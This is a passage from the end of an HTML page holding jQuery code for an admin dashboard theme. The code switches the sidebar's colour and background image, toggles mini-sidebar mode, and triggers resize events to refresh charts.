        $sidebar = $('.sidebar');

        $sidebar_img_container = $sidebar.find('.sidebar-background');

        $full_page = $('.full-page');

        $sidebar_responsive = $('body > .navbar-collapse');

        window_width = $(window).width();

        fixed_plugin_open = $('.sidebar .sidebar-wrapper .nav li.active a p').html();

        if (window_width > 767 && fixed_plugin_open == 'Dashboard') {
          if ($('.fixed-plugin .dropdown').hasClass('show-dropdown')) {
            $('.fixed-plugin .dropdown').addClass('open');
          }

        }

        $('.fixed-plugin a').click(function(event) {
          // Alex if we click on switch, stop propagation of the event, so the dropdown will not be hide, otherwise we set the  section active
          if ($(this).hasClass('switch-trigger')) {
            if (event.stopPropagation) {
              event.stopPropagation();
            } else if (window.event) {
              window.event.cancelBubble = true;
            }
          }
        });

        $('.fixed-plugin .active-color span').click(function() {
          $full_page_background = $('.full-page-background');

          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data-color', new_color);
          }

          if ($full_page.length != 0) {
            $full_page.attr('filter-color', new_color);
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.attr('data-color', new_color);
          }
        });

        $('.fixed-plugin .background-color .badge').click(function() {
          $(this).siblings().removeClass('active');
          $(this).addClass('active');

          var new_color = $(this).data('background-color');

          if ($sidebar.length != 0) {
            $sidebar.attr('data-background-color', new_color);
          }
        });

        $('.fixed-plugin .img-holder').click(function() {
          $full_page_background = $('.full-page-background');

          $(this).parent('li').siblings().removeClass('active');
          $(this).parent('li').addClass('active');


          var new_image = $(this).find("img").attr('src');

          if ($sidebar_img_container.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
            $sidebar_img_container.fadeOut('fast', function() {
              $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
              $sidebar_img_container.fadeIn('fast');
            });
          }

          if ($full_page_background.length != 0 && $('.switch-sidebar-image input:checked').length != 0) {
            var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

            $full_page_background.fadeOut('fast', function() {
              $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
              $full_page_background.fadeIn('fast');
            });
          }

          if ($('.switch-sidebar-image input:checked').length == 0) {
            var new_image = $('.fixed-plugin li.active .img-holder').find("img").attr('src');
            var new_image_full_page = $('.fixed-plugin li.active .img-holder').find('img').data('src');

            $sidebar_img_container.css('background-image', 'url("' + new_image + '")');
            $full_page_background.css('background-image', 'url("' + new_image_full_page + '")');
          }

          if ($sidebar_responsive.length != 0) {
            $sidebar_responsive.css('background-image', 'url("' + new_image + '")');
          }
        });

        $('.switch-sidebar-image input').change(function() {
          $full_page_background = $('.full-page-background');

          $input = $(this);

          if ($input.is(':checked')) {
            if ($sidebar_img_container.length != 0) {
              $sidebar_img_container.fadeIn('fast');
              $sidebar.attr('data-image', '#');
            }

            if ($full_page_background.length != 0) {
              $full_page_background.fadeIn('fast');
              $full_page.attr('data-image', '#');
            }

            background_image = true;
          } else {
            if ($sidebar_img_container.length != 0) {
              $sidebar.removeAttr('data-image');
              $sidebar_img_container.fadeOut('fast');
            }

            if ($full_page_background.length != 0) {
              $full_page.removeAttr('data-image', '#');
              $full_page_background.fadeOut('fast');
            }

            background_image = false;
          }
        });

        $('.switch-sidebar-mini input').change(function() {
          $body = $('body');

          $input = $(this);

          if (md.misc.sidebar_mini_active == true) {
            $('body').removeClass('sidebar-mini');
            md.misc.sidebar_mini_active = false;

            $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar();

          } else {

            $('.sidebar .sidebar-wrapper, .main-panel').perfectScrollbar('destroy');

            setTimeout(function() {
              $('body').addClass('sidebar-mini');

              md.misc.sidebar_mini_active = true;
            }, 300);
          }

          // we simulate the window Resize so the charts will get updated in realtime.
          var simulateWindowResize = setInterval(function() {
            window.dispatchEvent(new Event('resize'));
          }, 180);

          // we stop the simulation of Window Resize after the animations are completed
          setTimeout(function() {
            clearInterval(simulateWindowResize);
          }, 1000);

        });
      });
    });
  </script>
</body>

</html>
